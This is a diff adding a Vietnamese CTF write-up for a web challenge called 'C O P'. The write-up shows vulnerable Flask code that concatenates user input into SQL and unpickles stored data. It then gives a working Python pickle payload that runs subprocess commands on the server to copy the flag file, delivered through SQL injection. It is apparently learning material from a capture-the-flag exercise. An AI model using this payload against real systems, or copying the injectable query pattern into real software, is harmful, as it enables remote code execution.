@@ -4,6 +4,7 @@
 - [LoveTok](#lovetok)
 - [Toxic](#toxic)
 - [Neonify ](#neonify)
+- [C O P](#c_o_p)
 
 ## LoveTok
 
@@ -62,3 +63,43 @@ public function getTime()
 ![image](https://github.com/capy3ra/CTFwriteup/assets/80744099/8d6fc4bb-33e0-457e-8d3b-4d36a43f07eb)
 
 
+## C O P
+
+1. Fuzzing web đồng thời xem source code. Trước hết để ý 2 file `routes.py` và `models.py` nhận thấy web có 2 route chính. 1 là trang chủ lấy thông tin toàn bộ sản phẩm trong bảng products trong db. 2 là endpoint view lấy giá trị product_id để lấy thông tin chi tiết sản phẩm
+
+```
+#routes.py
+@web.route('/view/<product_id>')
+def product_details(product_id):
+    return render_template('item.html', product=shop.select_by_id(product_id))
+
+#models.py
+def select_by_id(product_id):
+	return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
+```
+
+2. Tuy nhiên nhận thấy ở đây, họ truy vấn sql bằng cách nối chuỗi, hơn nữa biến product_id có thể dễ dàng kiểm soát. (sqli)
+
+3. Hơn nữa ở đây họ dùng pickle để serialize và deserialize thông tin sản phẩm. Lợi dụng pickle để exploit rce [RCE with pickle](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)
+
+4. Dùng dump + b64encode object Items rồi lấy giá trị sau đó insert cột data trong bảng product. Khi mấy lấy dữ liệu thì load + b64 decode từ db.
+
+5. Dựa vào wu trên, code serialize để server pickle load.
+
+```
+import pickle
+import base64
+import subprocess
+
+payload = ['cat', 'flag.txt', 'application/static/.']
+
+class RCE:
+    def __reduce__(self):
+        return (subprocess.check_output, (payload, ))
+
+if __name__ == '__main__':
+    print(base64.b64encode(pickle.dumps(RCE())))
+
+```
+
+6. Sau đó vào url /static/flag.txt lấy flag. (Không hiểu sao cách dùng os.system không được nên phải thay bằng subprocess)
